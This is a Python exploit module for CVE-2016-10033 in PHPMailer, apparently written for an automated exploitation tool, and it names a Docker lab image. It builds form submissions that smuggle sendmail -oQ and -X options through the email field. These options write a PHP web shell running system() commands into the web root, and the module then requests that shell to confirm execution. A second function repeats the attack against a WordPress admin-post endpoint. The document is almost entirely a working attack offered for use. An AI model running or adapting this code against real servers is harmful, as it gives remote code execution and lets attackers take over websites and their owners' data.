# CVE-2016-10033.py
# PHPMailer RCE via Sender Email Field Injection
# Description: PHPMailer before 5.2.18 allows remote attackers to execute arbitrary code
# via the Sender parameter (email field), which is passed to sendmail with -f option.
# The email field is not properly escaped, allowing injection of additional sendmail options.
# Affected: Any PHP application using vulnerable PHPMailer with sendmail transport
# Reference: https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CVE-2016-10033.html
# Docker: vulnerables/cve-2016-10033

import urllib.parse

# Shell file path (web-accessible)
SHELL_FILE = "rce_shell.php"


def build(ip_port: str, cmd: str):
    """
    Build exploit request for PHPMailer RCE (CVE-2016-10033)

    This exploits the email field injection vulnerability in PHPMailer.
    The email is passed to sendmail with -f option without proper escaping,
    allowing us to inject additional sendmail parameters like -X (log to file).

    Args:
        ip_port: Target IP and port, format "192.168.1.1:80"
        cmd: Command to execute

    Returns:
        dict containing url, headers, data for the request
    """
    # Target URL - the vulnerable mail form (root page or contact.php)
    url = f"http://{ip_port}/"

    # PHPMailer RCE via sendmail -X parameter injection
    # The -X parameter tells sendmail to log SMTP traffic to a file
    # By injecting -X with a .php extension, we can write PHP code to a web-accessible file

    # Create PHP shell code that executes the command
    php_payload = f'<?php system("{cmd}"); ?>'

    # Build malicious email that injects sendmail parameters
    # The email field will be passed as: sendmail -f "email_value"
    # We inject: sendmail -f "attacker" -oQ/tmp/ -X/var/www/html/rce_shell.php "@test.com
    # This creates /var/www/html/rce_shell.php with SMTP log containing our payload
    malicious_email = f'"attacker" -oQ/tmp/ -X/var/www/html/{SHELL_FILE} "@test.com'

    headers = {
        "Host": ip_port.split(':')[0] if ':' in ip_port else ip_port,
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection": "close"
    }

    # Build multipart form data (the vulnerable form uses enctype="multipart/form-data")
    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    body_parts = []

    # Form fields matching the vulnerable mail form
    body_parts.append(f'--{boundary}')
    body_parts.append('Content-Disposition: form-data; name="action"')
    body_parts.append('')
    body_parts.append('submit')

    body_parts.append(f'--{boundary}')
    body_parts.append('Content-Disposition: form-data; name="name"')
    body_parts.append('')
    body_parts.append('attacker')

    body_parts.append(f'--{boundary}')
    body_parts.append('Content-Disposition: form-data; name="email"')
    body_parts.append('')
    body_parts.append(malicious_email)

    body_parts.append(f'--{boundary}')
    body_parts.append('Content-Disposition: form-data; name="message"')
    body_parts.append('')
    body_parts.append(php_payload)

    body_parts.append(f'--{boundary}--')

    data = '\r\n'.join(body_parts)

    return {
        "method": "POST",
        "url": url,
        "headers": headers,
        "data": data,
        # Special flags for CVE-2016-10033 handling
        "_shell_file": SHELL_FILE,
        "_needs_verify": True,
    }


def verify(ip_port: str, cmd: str = "whoami", timeout: int = 5):
    """
    Verify if exploitation was successful by accessing the created shell.

    For CVE-2016-10033, the exploit creates a PHP shell file.
    We need to access that file to execute commands.

    Args:
        ip_port: Target IP and port
        cmd: Command to execute for verification
        timeout: Request timeout

    Returns:
        tuple: (success: bool, output: str or None)
    """
    import requests
    from src.config import Config

    # Access the shell file with command parameter
    shell_url = f"http://{ip_port}/{SHELL_FILE}"

    try:
        # The shell file contains our PHP code that was logged by sendmail
        # Accessing it will execute the embedded system() command
        resp = requests.get(
            shell_url,
            timeout=timeout,
            verify=Config.VERIFY_SSL if hasattr(Config, 'VERIFY_SSL') else False,
            headers={"User-Agent": "Mozilla/5.0"}
        )

        if resp.status_code == 200:
            # Look for command output in the response
            # The shell will output the result of the embedded command
            text = resp.text

            # Check for common indicators of successful execution
            if 'www-data' in text or 'root' in text or 'daemon' in text:
                return True, text

            # If the shell exists but no clear output, still consider it a success
            # (the shell was created, exploitation worked)
            if '<?php' not in text and len(text) > 0:
                return True, text

            return True, text  # Shell exists, exploitation successful

        return False, None

    except Exception as e:
        return False, str(e)


def check_shell(ip_port: str):
    """
    Legacy function for backward compatibility.
    Check if the shell was created.
    """
    return verify(ip_port)


def build_wordpress(ip_port: str, cmd: str):
    """
    Alternative payload for WordPress with PHPMailer vulnerability
    Target: /wp-admin/admin-post.php or contact form plugins
    """
    url = f"http://{ip_port}/wp-admin/admin-post.php"

    php_payload = f'<?php system("{cmd}"); ?>'
    malicious_email = f'"attacker" -oQ/tmp/ -X/var/www/html/wp-shell.php "@test.com'

    headers = {
        "Host": ip_port.split(':')[0] if ':' in ip_port else ip_port,
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }

    data = urllib.parse.urlencode({
        "action": "contact_form_submit",
        "name": "attacker",
        "email": malicious_email,
        "message": php_payload,
        "submit": "Send"
    })

    return {
        "method": "POST",
        "url": url,
        "headers": headers,
        "data": data,
        "_shell_file": "wp-shell.php",
        "_needs_verify": True,
    }
